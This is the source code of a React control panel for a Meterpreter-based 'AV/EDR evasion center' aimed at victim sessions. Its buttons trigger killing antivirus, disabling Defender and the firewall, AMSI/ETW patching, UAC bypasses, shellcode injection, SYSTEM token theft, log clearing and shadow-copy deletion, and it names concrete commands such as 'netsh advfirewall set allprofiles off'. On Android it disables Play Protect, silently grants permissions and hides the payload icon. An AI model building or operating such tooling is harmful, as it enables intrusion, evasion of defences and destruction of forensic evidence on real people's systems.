"use client";

/**
 * AV / EDR EVASION CENTER
 * Detect, kill, bypass, inject, clean — all live via Meterpreter
 */

import { useState, useCallback, useEffect } from "react";

type Session = { id: number; ip: string; platform: string; hostname: string };
type AvProduct = { name: string; state: string; active: boolean };
type StepResult = { step: string; ok: boolean; out?: string };

type DetectResult = {
  products: AvProduct[];
  runningAv: string[];
  firewall: boolean;
  defenderRTP: boolean;
};

const UAC_METHODS = [
  { id: "fodhelper",   label: "fodhelper.exe",    os: "Win10+",   risk: "medium" },
  { id: "eventvwr",    label: "eventvwr.exe",      os: "Win7-10",  risk: "medium" },
  { id: "comhijack",   label: "COM Hijack",        os: "Win10+",   risk: "high" },
  { id: "sdclt",       label: "sdclt.exe",         os: "Win10",    risk: "medium" },
  { id: "silentclean", label: "SilentCleanup",     os: "Win10+",   risk: "low" },
];

const MIGRATE_PROCS = [
  { name: "explorer.exe",      reason: "User context, always running" },
  { name: "svchost.exe",       reason: "SYSTEM context, hides in crowd" },
  { name: "RuntimeBroker.exe", reason: "Signed MS binary, UWP broker" },
  { name: "SearchIndexer.exe", reason: "Persistent background process" },
  { name: "notepad.exe",       reason: "Spawn on demand, innocuous" },
];

export default function EvasionPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [session, setSession] = useState<Session | null>(null);
  const [tab, setTab] = useState<"detect"|"defender"|"amsi"|"uac"|"migrate"|"inject"|"logs"|"android">("detect");
  const [loading, setLoading] = useState<string | null>(null);
  const [log, setLog] = useState<string[]>([]);

  // Detect state
  const [detected, setDetected] = useState<DetectResult | null>(null);

  // UAC state
  const [uacMethod, setUacMethod] = useState("fodhelper");

  // Migrate state
  const [migrateProc, setMigrateProc] = useState("explorer.exe");

  // Inject state
  const [injectPid, setInjectPid] = useState("");

  // Obfuscate
  const [obfCmd, setObfCmd] = useState("whoami /all");
  const [obfResult, setObfResult] = useState<Record<string, string> | null>(null);

  const addLog = useCallback((msg: string, t: "info"|"ok"|"err" = "info") => {
    const icon = t === "ok" ? "✓" : t === "err" ? "✗" : "·";
    setLog((p) => [`[${new Date().toLocaleTimeString()}] ${icon} ${msg}`, ...p].slice(0, 200));
  }, []);

  useEffect(() => {
    fetch("/api/sessions").then((r) => r.json()).then((d) => {
      const list = Array.isArray(d) ? d : d.sessions ?? [];
      setSessions(list);
      if (list.length > 0) setSession(list[0]);
    }).catch(() => {});
  }, []);

  const call = useCallback(async (action: string, extra: Record<string, unknown> = {}) => {
    if (!session) return { ok: false, error: "No session" };
    const r = await fetch("/api/evasion", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: session.id, action, ...extra }),
    });
    return r.json() as Promise<Record<string, unknown>>;
  }, [session]);

  const runDetect = async () => {
    setLoading("detect"); addLog("Scanning for AV/EDR products…");
    const res = await call("detect");
    setLoading(null);
    if (res.ok) {
      const d = res.data as DetectResult;
      setDetected(d);
      addLog(`Found ${d.products.length} WMI product(s), ${d.runningAv.length} AV process(es)`, "ok");
      if (d.defenderRTP) addLog("Windows Defender RTP: ACTIVE", "err");
      if (d.firewall) addLog("Windows Firewall: ENABLED", "err");
    } else addLog(`Detect failed: ${res.error}`, "err");
  };

  const runAction = useCallback(async (action: string, label: string, extra: Record<string, unknown> = {}) => {
    setLoading(action); addLog(`Running: ${label}…`);
    const res = await call(action, extra);
    setLoading(null);
    if (res.ok) {
      addLog(`${label} — success`, "ok");
      if (res.data && typeof res.data === "object") {
        const d = res.data as Record<string, unknown>;
        if (d.steps) (d.steps as StepResult[]).forEach((s) => addLog(`  ${s.step}: ${s.ok ? "✓" : "✗"}`));
        if (d.killed) addLog(`  Killed: ${(d.killed as string[]).join(", ")}`, "ok");
        if (d.results) (d.results as Array<{technique: string; ok: boolean}>).forEach((r) => addLog(`  ${r.technique}: ${r.ok ? "✓" : "✗"}`));
      }
    } else addLog(`${label} failed: ${res.error}`, "err");
  }, [call, addLog]);

  const runObfuscate = async () => {
    setLoading("obf");
    const res = await call("obfuscate", { command: obfCmd });
    setLoading(null);
    if (res.ok) setObfResult(res.data as Record<string, string>);
  };

  const TABS = [
    { id: "detect",   label: "DETECT",     icon: "🔍" },
    { id: "defender", label: "DEFENDER",   icon: "🛡" },
    { id: "amsi",     label: "AMSI/ETW",   icon: "⚡" },
    { id: "uac",      label: "UAC BYPASS", icon: "🔓" },
    { id: "migrate",  label: "MIGRATE",    icon: "👻" },
    { id: "inject",   label: "INJECT",     icon: "💉" },
    { id: "logs",     label: "CLEAN LOGS", icon: "🧹" },
    { id: "android",  label: "ANDROID",    icon: "🤖" },
  ] as const;

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">

      {/* LEFT PANEL */}
      <aside className="w-52 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest">AV/EDR EVASION CENTER</div>
          <div className="text-[8px] text-green-900/40">STEALTH OPS // TOP SECRET</div>
        </div>

        {/* Session */}
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[8px] text-green-900 tracking-widest mb-1">TARGET SESSION</div>
          {sessions.map((s) => (
            <button key={s.id} onClick={() => setSession(s)}
              className={`w-full text-left p-1.5 rounded border mb-1 text-[8px] transition-all ${
                session?.id === s.id ? "border-green-700/60 bg-green-950/40" : "border-green-900/20 hover:border-green-800/40"
              }`}>
              <div className="text-green-400">#{s.id} {s.platform}</div>
              <div className="text-green-800 truncate">{s.hostname ?? s.ip}</div>
            </button>
          ))}
          {sessions.length === 0 && <div className="text-[8px] text-green-900/30 p-1">No sessions</div>}
        </div>

        {/* Tabs */}
        <div className="flex-1 overflow-y-auto p-1">
          {TABS.map((t) => (
            <button key={t.id} onClick={() => setTab(t.id as typeof tab)}
              className={`w-full text-left px-2 py-1.5 rounded text-[9px] mb-0.5 transition-all ${
                tab === t.id ? "bg-green-950/40 text-green-300 border border-green-800/40" : "text-green-800 hover:text-green-600"
              }`}>
              {t.icon} {t.label}
            </button>
          ))}
        </div>

        {/* Status */}
        {detected && (
          <div className="p-2 border-t border-green-900/30 space-y-1">
            <div className="text-[8px] text-green-900 tracking-widest">SECURITY STATUS</div>
            <div className={`text-[8px] flex items-center gap-1 ${detected.defenderRTP ? "text-red-500" : "text-green-600"}`}>
              <div className={`w-1.5 h-1.5 rounded-full ${detected.defenderRTP ? "bg-red-500" : "bg-green-600"}`} />
              Defender {detected.defenderRTP ? "ACTIVE" : "OFF"}
            </div>
            <div className={`text-[8px] flex items-center gap-1 ${detected.firewall ? "text-red-500" : "text-green-600"}`}>
              <div className={`w-1.5 h-1.5 rounded-full ${detected.firewall ? "bg-red-500" : "bg-green-600"}`} />
              Firewall {detected.firewall ? "ON" : "OFF"}
            </div>
            <div className="text-[8px] text-green-800">{detected.runningAv.length} AV proc(s)</div>
          </div>
        )}
      </aside>

      {/* MAIN */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <div className="flex-1 overflow-y-auto p-5">

          {/* ── DETECT ─────────────────────────────────────────── */}
          {tab === "detect" && (
            <div>
              <div className="flex items-center gap-4 mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">AV / EDR DETECTION</h2>
                <button onClick={runDetect} disabled={!!loading || !session}
                  className="px-4 py-1.5 text-[9px] border border-green-700/50 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                  {loading === "detect" ? "SCANNING…" : "▶ SCAN TARGET"}
                </button>
              </div>

              {!detected ? (
                <div className="text-center py-16 text-[9px] text-green-900/30">
                  Click SCAN TARGET to enumerate security products on the victim
                </div>
              ) : (
                <div className="space-y-4">
                  {/* Quick status row */}
                  <div className="grid grid-cols-4 gap-3">
                    {[
                      { label: "WMI Products",   val: detected.products.length,   color: detected.products.length > 0 ? "red" : "green" },
                      { label: "AV Processes",   val: detected.runningAv.length,  color: detected.runningAv.length > 0 ? "red" : "green" },
                      { label: "Defender RTP",   val: detected.defenderRTP ? "ON" : "OFF", color: detected.defenderRTP ? "red" : "green" },
                      { label: "Firewall",       val: detected.firewall ? "ON" : "OFF",     color: detected.firewall ? "yellow" : "green" },
                    ].map(({ label, val, color }) => (
                      <div key={label} className={`border border-${color}-900/20 rounded p-3 text-center`}>
                        <div className={`text-xl font-bold text-${color}-400 tabular-nums`}>{val}</div>
                        <div className="text-[8px] text-green-900/50 mt-0.5">{label}</div>
                      </div>
                    ))}
                  </div>

                  {/* WMI products */}
                  {detected.products.length > 0 && (
                    <div className="border border-red-900/20 rounded p-4">
                      <div className="text-[9px] text-red-600 tracking-widest mb-2">WMI SECURITY PRODUCTS</div>
                      <div className="space-y-1">
                        {detected.products.map((p) => (
                          <div key={p.name} className="flex items-center gap-3 text-[9px]">
                            <div className={`w-2 h-2 rounded-full ${p.active ? "bg-red-400 animate-pulse" : "bg-yellow-700"}`} />
                            <span className="text-red-300">{p.name}</span>
                            <span className="text-green-900/40">{p.state}</span>
                            <span className={`ml-auto ${p.active ? "text-red-500" : "text-yellow-700"}`}>{p.active ? "ACTIVE" : "INACTIVE"}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Running AV processes */}
                  {detected.runningAv.length > 0 && (
                    <div className="border border-orange-900/20 rounded p-4">
                      <div className="text-[9px] text-orange-600 tracking-widest mb-2">DETECTED AV/EDR PROCESSES</div>
                      <div className="flex flex-wrap gap-1.5">
                        {detected.runningAv.map((p) => (
                          <span key={p} className="border border-orange-900/30 rounded px-2 py-0.5 text-[8px] text-orange-500">{p}</span>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Recommended actions */}
                  <div className="border border-green-900/15 rounded p-4">
                    <div className="text-[9px] text-green-700 tracking-widest mb-3">RECOMMENDED NEXT ACTIONS</div>
                    <div className="grid grid-cols-2 gap-2">
                      {[
                        { label: "Kill AV Processes",    action: () => { setTab("detect"); runAction("kill_av", "Kill AV processes"); } },
                        { label: "Disable Defender",     action: () => setTab("defender") },
                        { label: "AMSI + ETW Bypass",    action: () => setTab("amsi") },
                        { label: "Elevate via UAC",      action: () => setTab("uac") },
                        { label: "Migrate Process",      action: () => setTab("migrate") },
                        { label: "Clear Forensic Logs",  action: () => setTab("logs") },
                      ].map(({ label, action }) => (
                        <button key={label} onClick={action}
                          className="text-left px-3 py-2 border border-green-900/20 rounded text-[9px] text-green-700 hover:border-green-700/40 hover:text-green-500 transition-all">
                          › {label}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ── DEFENDER ───────────────────────────────────────── */}
          {tab === "defender" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-5">WINDOWS DEFENDER BYPASS</h2>
              <div className="grid grid-cols-2 gap-3 mb-5">
                {[
                  { label: "Kill AV Processes",              action: "kill_av",          desc: "SIGKILL all known AV/EDR processes",        danger: true },
                  { label: "Disable Real-Time Monitoring",   action: "disable_defender", desc: "Set-MpPreference + registry group policy",  danger: true },
                  { label: "Add Full Disk Exclusion",        action: "disable_defender", desc: "C:\\ excluded from all Defender scanning",  danger: false },
                  { label: "Stop WinDefend Service",         action: "disable_defender", desc: "sc config WinDefend start=disabled",        danger: true },
                  { label: "Disable Firewall",               action: "fw_disable",       desc: "netsh advfirewall set allprofiles off",     danger: true },
                  { label: "Delete VSS Shadow Copies",       action: "disable_vss",      desc: "vssadmin + bcdedit recovery=No",            danger: true },
                ].map(({ label, action, desc, danger }) => (
                  <button key={label} onClick={() => runAction(action, label)}
                    disabled={!!loading || !session}
                    className={`text-left p-4 border rounded transition-all disabled:opacity-40 ${
                      danger ? "border-red-900/30 hover:border-red-700/50 hover:bg-red-950/10" : "border-green-900/20 hover:border-green-700/40"
                    }`}>
                    <div className={`text-[9px] font-semibold mb-1 ${danger ? "text-red-400" : "text-green-400"}`}>{label}</div>
                    <div className="text-[8px] text-green-900/50">{desc}</div>
                    {danger && <div className="text-[7px] text-red-900/50 mt-1">⚠ REQUIRES SYSTEM/ADMIN</div>}
                  </button>
                ))}
              </div>

              {/* Obfuscation tool */}
              <div className="border border-green-900/15 rounded p-4">
                <div className="text-[9px] text-green-700 tracking-widest mb-3">COMMAND OBFUSCATION</div>
                <div className="flex gap-2 mb-3">
                  <input value={obfCmd} onChange={(e) => setObfCmd(e.target.value)}
                    className="flex-1 bg-black/30 border border-green-900/30 rounded px-3 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
                  <button onClick={runObfuscate} disabled={loading === "obf"}
                    className="px-4 py-1.5 text-[9px] border border-green-700/50 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                    OBFUSCATE
                  </button>
                </div>
                {obfResult && (
                  <div className="space-y-2">
                    {Object.entries(obfResult).filter(([k]) => k !== "original").map(([k, v]) => (
                      <div key={k}>
                        <div className="text-[7px] text-green-900/50 uppercase tracking-widest mb-0.5">{k}</div>
                        <div className="flex items-start gap-2">
                          <code className="flex-1 bg-black/40 rounded p-2 text-[8px] text-green-300 font-mono break-all">{v}</code>
                          <button onClick={() => navigator.clipboard.writeText(v)}
                            className="text-[8px] text-green-900 hover:text-green-600 px-1 shrink-0">copy</button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ── AMSI / ETW ─────────────────────────────────────── */}
          {tab === "amsi" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-2">AMSI + ETW BYPASS</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                AMSI (Antimalware Scan Interface) intercepts PowerShell, WScript, and .NET execution.
                ETW (Event Tracing) feeds CrowdStrike/SentinelOne behavioral sensors.
                Both patched in-memory — no disk writes required.
              </p>
              <div className="grid grid-cols-1 gap-3 max-w-xl">
                {[
                  { label: "Bypass AMSI", action: "amsi_bypass", desc: "3 techniques: AmsiInitFailed reflection → Base64 patch → ScriptBlock logging off", badge: "MEMORY ONLY" },
                  { label: "Patch ETW", action: "etw_bypass", desc: "Zero out EtwEventWrite provider in current process — silences all ETW telemetry", badge: "MEMORY ONLY" },
                  { label: "Disable CLM", action: "ev_clm_bypass", desc: "Set $env:__PSLockdownPolicy=0 to exit Constrained Language Mode", badge: "PS ONLY" },
                  { label: "Disable PS Logging", action: "clear_logs", desc: "Disable ScriptBlockLogging, ModuleLogging, and Transcription in registry", badge: "REGISTRY" },
                ].map(({ label, action, desc, badge }) => (
                  <div key={label} className="border border-green-900/20 rounded p-4 flex items-center justify-between gap-4">
                    <div>
                      <div className="text-[9px] text-green-400 mb-0.5 flex items-center gap-2">
                        {label}
                        <span className="text-[7px] border border-green-900/30 px-1 rounded text-green-900">{badge}</span>
                      </div>
                      <div className="text-[8px] text-green-900/50">{desc}</div>
                    </div>
                    <button onClick={() => runAction(action, label)} disabled={!!loading || !session}
                      className="shrink-0 px-4 py-1.5 text-[9px] border border-green-700/40 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                      RUN
                    </button>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ── UAC BYPASS ─────────────────────────────────────── */}
          {tab === "uac" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-5">UAC BYPASS</h2>
              <div className="grid grid-cols-3 gap-3 mb-5">
                {UAC_METHODS.map((m) => (
                  <button key={m.id} onClick={() => setUacMethod(m.id)}
                    className={`text-left p-3 border rounded transition-all ${
                      uacMethod === m.id ? "border-yellow-700/60 bg-yellow-950/20" : "border-green-900/20 hover:border-green-800/30"
                    }`}>
                    <div className={`text-[9px] mb-1 ${uacMethod === m.id ? "text-yellow-400" : "text-green-600"}`}>{m.label}</div>
                    <div className="text-[7px] text-green-900/40">{m.os}</div>
                    <div className={`text-[7px] mt-1 ${m.risk === "high" ? "text-red-700" : m.risk === "medium" ? "text-yellow-800" : "text-green-800"}`}>
                      RISK: {m.risk.toUpperCase()}
                    </div>
                  </button>
                ))}
              </div>
              <button onClick={() => runAction("uac_bypass", `UAC bypass (${uacMethod})`, { method: uacMethod })}
                disabled={!!loading || !session}
                className="px-6 py-2 text-[9px] border border-yellow-700/50 text-yellow-400 rounded hover:bg-yellow-950/20 transition-all disabled:opacity-40 tracking-widest">
                ▶ EXECUTE UAC BYPASS — {uacMethod.toUpperCase()}
              </button>
            </div>
          )}

          {/* ── MIGRATE ────────────────────────────────────────── */}
          {tab === "migrate" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-2">PROCESS MIGRATION</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Move Meterpreter into a trusted process. If the victim closes the app that was exploited,
                the session survives. Choose a process that matches victim activity.
              </p>
              <div className="space-y-2 mb-5">
                {MIGRATE_PROCS.map((p) => (
                  <button key={p.name} onClick={() => setMigrateProc(p.name)}
                    className={`w-full text-left p-3 border rounded transition-all flex items-center gap-4 ${
                      migrateProc === p.name ? "border-green-700/60 bg-green-950/20" : "border-green-900/20 hover:border-green-800/30"
                    }`}>
                    <div className={`w-2 h-2 rounded-full ${migrateProc === p.name ? "bg-green-400" : "bg-green-900"}`} />
                    <span className="font-mono text-[9px] text-green-400 w-36">{p.name}</span>
                    <span className="text-[8px] text-green-900/50">{p.reason}</span>
                  </button>
                ))}
              </div>
              <div className="flex gap-3">
                <button onClick={() => runAction("migrate", `Migrate → ${migrateProc}`, { process: migrateProc })}
                  disabled={!!loading || !session}
                  className="px-6 py-2 text-[9px] border border-green-700/50 rounded hover:bg-green-950/30 transition-all disabled:opacity-40 tracking-widest">
                  ▶ MIGRATE → {migrateProc}
                </button>
                <button onClick={() => runAction("token_steal", "Steal SYSTEM token", { pid: 4 })}
                  disabled={!!loading || !session}
                  className="px-6 py-2 text-[9px] border border-yellow-700/50 text-yellow-600 rounded hover:bg-yellow-950/20 transition-all disabled:opacity-40 tracking-widest">
                  STEAL SYSTEM TOKEN
                </button>
              </div>
            </div>
          )}

          {/* ── INJECT ─────────────────────────────────────────── */}
          {tab === "inject" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-2">PROCESS INJECTION</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Inject shellcode into a remote process PID. Target high-trust system processes
                to evade behavioral detection. Reflective DLL injection leaves no disk artifact.
              </p>
              <div className="grid grid-cols-2 gap-4 mb-5">
                <div className="border border-green-900/20 rounded p-4">
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">SHELLCODE INJECTION</div>
                  <label className="block text-[8px] text-green-900/50 mb-1">Target PID (0 = auto-select)</label>
                  <input value={injectPid} onChange={(e) => setInjectPid(e.target.value)}
                    placeholder="1234"
                    className="w-full mb-3 bg-black/30 border border-green-900/30 rounded px-3 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
                  <button onClick={() => runAction("inject", "Shellcode injection", { pid: parseInt(injectPid) || 0 })}
                    disabled={!!loading || !session}
                    className="w-full px-4 py-2 text-[9px] border border-red-800/50 text-red-500 rounded hover:bg-red-950/20 transition-all disabled:opacity-40">
                    💉 INJECT
                  </button>
                </div>
                <div className="space-y-2">
                  {[
                    { label: "Process Hollowing",    desc: "Spawn suspended process, replace image in memory" },
                    { label: "Reflective DLL",       desc: "Load DLL entirely in-memory, no disk write" },
                    { label: "PPID Spoofing",        desc: "Fake parent PID to hide in process tree" },
                    { label: "Token Impersonation",  desc: "Impersonate NT AUTHORITY\\SYSTEM token" },
                  ].map(({ label, desc }) => (
                    <div key={label} className="border border-green-900/15 rounded p-3">
                      <div className="text-[9px] text-green-600 mb-0.5">{label}</div>
                      <div className="text-[7px] text-green-900/40">{desc}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ── CLEAN LOGS ─────────────────────────────────────── */}
          {tab === "logs" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-5">FORENSIC LOG CLEARING</h2>
              <div className="grid grid-cols-2 gap-3 mb-5">
                {[
                  { label: "Clear All Event Logs",      action: "clear_logs", desc: "Security, System, Application, PowerShell, Sysmon",     danger: true },
                  { label: "Delete Shadow Copies",      action: "disable_vss", desc: "vssadmin + wmic + bcdedit /set recoveryenabled No",     danger: true },
                  { label: "Wipe PS History",           action: "clear_logs", desc: "PSReadline history file + in-memory Clear-History",     danger: false },
                  { label: "Clear Prefetch",            action: "clear_logs", desc: "C:\\Windows\\Prefetch\\*.pf — execution evidence",       danger: false },
                  { label: "Clear RecentDocs / MRU",    action: "clear_logs", desc: "HKCU registry recent file access trails",               danger: false },
                  { label: "Empty Recycle Bin",         action: "clear_logs", desc: "Clear-RecycleBin -Force",                               danger: false },
                ].map(({ label, action, desc, danger }) => (
                  <button key={label} onClick={() => runAction(action, label)} disabled={!!loading || !session}
                    className={`text-left p-4 border rounded transition-all disabled:opacity-40 ${
                      danger ? "border-red-900/20 hover:border-red-700/40 hover:bg-red-950/10" : "border-green-900/20 hover:border-green-700/30"
                    }`}>
                    <div className={`text-[9px] mb-1 ${danger ? "text-red-400" : "text-green-500"}`}>{label}</div>
                    <div className="text-[7px] text-green-900/40">{desc}</div>
                  </button>
                ))}
              </div>
              <div className="border border-red-900/10 rounded p-3 text-[8px] text-red-900/50">
                ⚠ IRREVERSIBLE — event logs, shadow copies, and prefetch files cannot be recovered once deleted.
                Run AFTER completing all objectives.
              </div>
            </div>
          )}

          {/* ── ANDROID ────────────────────────────────────────── */}
          {tab === "android" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-5">ANDROID SECURITY BYPASS</h2>
              <div className="grid grid-cols-2 gap-3">
                {[
                  { label: "Disable Play Protect",     action: "play_protect", desc: "Disable Google Play malware scanner — allows payload to persist without removal", danger: true },
                  { label: "Disable Samsung Knox",     action: "play_protect", desc: "Disable Knox container agent and enterprise security enforcement", danger: true },
                  { label: "Grant All Permissions",    action: "ev_android_perms", desc: "Auto-grant Camera, Mic, Location, SMS, Contacts without user prompt", danger: false },
                  { label: "Hide App Icon",            action: "ev_android_hide", desc: "Remove payload icon from launcher — becomes completely invisible", danger: false },
                  { label: "Disable Unknown Sources",  action: "play_protect", desc: "Enable install from unknown sources (sideloading)", danger: false },
                  { label: "Bypass Screen Overlay",   action: "play_protect", desc: "Grant SYSTEM_ALERT_WINDOW permission for overlay attacks", danger: false },
                ].map(({ label, action, desc, danger }) => (
                  <button key={label} onClick={() => runAction(action, label)} disabled={!!loading || !session}
                    className={`text-left p-4 border rounded transition-all disabled:opacity-40 ${
                      danger ? "border-red-900/20 hover:border-red-700/40 hover:bg-red-950/10" : "border-green-900/20 hover:border-green-700/30"
                    }`}>
                    <div className={`text-[9px] mb-1 ${danger ? "text-red-400" : "text-green-500"}`}>{label}</div>
                    <div className="text-[7px] text-green-900/40">{desc}</div>
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* Log strip */}
        <div className="h-32 border-t border-green-900/20 bg-black/40 p-2 overflow-y-auto">
          <div className="text-[7px] text-green-900/40 tracking-widest mb-1">OPERATION LOG</div>
          {log.length === 0 ? (
            <div className="text-[8px] text-green-900/20">Awaiting commands…</div>
          ) : log.map((l, i) => (
            <div key={i} className={`text-[8px] font-mono leading-5 ${
              l.includes("✓") ? "text-green-500" : l.includes("✗") ? "text-red-500" : "text-green-800"
            }`}>{l}</div>
          ))}
        </div>
      </div>
    </div>
  );
}
